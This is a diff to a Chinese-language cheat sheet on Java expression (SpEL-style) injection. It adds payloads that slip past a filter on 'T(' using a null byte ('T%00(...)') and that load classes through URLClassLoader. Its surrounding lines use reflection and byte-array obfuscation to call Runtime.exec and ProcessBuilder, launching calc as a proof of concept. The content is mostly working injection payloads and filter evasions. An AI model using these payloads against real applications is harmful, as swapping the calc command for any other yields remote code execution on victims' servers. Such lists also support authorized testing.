@@ -186,6 +186,11 @@ new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).sta
 
 T( 被过滤
 ```java
+T%00(java.io.File)
+```
+[![tk4Fmj.png](https://s1.ax1x.com/2020/05/27/tk4Fmj.png)](https://imgchr.com/i/tk4Fmj)
+
+```java
 1.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke(1.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(1.class.forName("java.lang.Runtime")),"calc.exe")
 ```
 
@@ -211,7 +216,12 @@ T( 被过滤
 常规注入里基本都可转化为反射注入，这里不在列举
 把常见的命令执行和文件读取转化为一句话即可
 
+## 其他
 
+获取类
+```java
+T%00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.io.File")
+```
 
 
 # 三、 参考
